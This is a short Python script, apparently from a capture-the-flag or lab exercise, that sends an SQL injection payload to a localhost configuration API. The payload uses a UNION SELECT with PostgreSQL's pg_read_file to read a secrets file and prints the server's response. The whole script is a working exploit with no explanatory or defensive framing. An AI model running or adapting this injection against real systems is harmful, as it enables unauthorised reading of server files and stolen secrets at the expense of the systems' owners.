import requests

BASE = 'http://localhost/api/config'

payload = "' UNION SELECT pg_read_file('/secrets/flag.txt')--"
r = requests.get(BASE, params={'section': payload})
print(f"HTTP {r.status_code}")
print(r.json())
